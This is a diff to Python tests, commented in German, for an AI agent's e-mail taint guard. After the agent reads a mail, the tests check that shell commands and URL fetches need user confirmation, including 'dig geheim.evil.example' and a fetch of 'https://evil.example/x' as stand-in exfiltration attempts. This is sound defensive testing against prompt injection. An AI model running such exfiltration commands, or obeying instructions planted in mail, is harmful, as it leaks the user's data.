@@ -189,9 +189,16 @@ def test_agent_asks_before_shell_or_web_after_reading_mail(cfg, memory, imap):
         assert not asked  # ohne Mail: lesender Befehl ohne Rückfrage
         await agent._execute({"function": {"name": "mail_read", "arguments": {"uid": 4}}}, emit, confirm)
         assert agent._tainted
+        await agent._execute({"function": {"name": "run_shell", "arguments": {"command": "cd ~ && echo ok"}}},
+                             emit, confirm)
+        assert not asked  # rein lesend und lokal: kann nichts verändern oder hinausschicken
         name, result, _ = await agent._execute(
-            {"function": {"name": "run_shell", "arguments": {"command": "ls"}}}, emit, confirm)
+            {"function": {"name": "run_shell", "arguments": {"command": "dig geheim.evil.example"}}}, emit, confirm)
         assert asked and asked[-1][0] == "run_shell" and "E-Mail" in asked[-1][1] and "abgelehnt" in result
+        agent.auto_mode = "auto"  # Auto gibt nach einer Mail nichts frei, was etwas verändert
+        await agent._execute({"function": {"name": "run_shell", "arguments": {"command": "mkdir -p ~/x"}}},
+                             emit, confirm)
+        assert asked[-1][0] == "run_shell" and "E-Mail" in asked[-1][1]
         await agent._execute({"function": {"name": "fetch_url", "arguments": {"url": "https://evil.example/x"}}},
                              emit, confirm)
         assert asked[-1][0] == "fetch_url"
@@ -229,10 +236,10 @@ def test_mail_protection_lasts_while_the_mail_is_in_the_chat(cfg, memory, imap):
 
     async def scenario():
         await agent.run('/tool mail_read {"uid": 4}', emit, confirm)
-        await agent.run('/tool run_shell {"command": "ls"}', emit, confirm)  # neue Anfrage, gleicher Chat
-        assert asked == ["run_shell"]
+        await agent.run('/tool fetch_url {"url": "https://evil.example/x"}', emit, confirm)  # neue Anfrage, gleicher Chat
+        assert asked == ["fetch_url"]
         memory.new_chat()  # neuer Chat ohne Mail → wieder ohne Rückfrage
         await agent.run('/tool run_shell {"command": "ls"}', emit, confirm)
-        assert asked == ["run_shell"]
+        assert asked == ["fetch_url"]
 
     run(scenario())
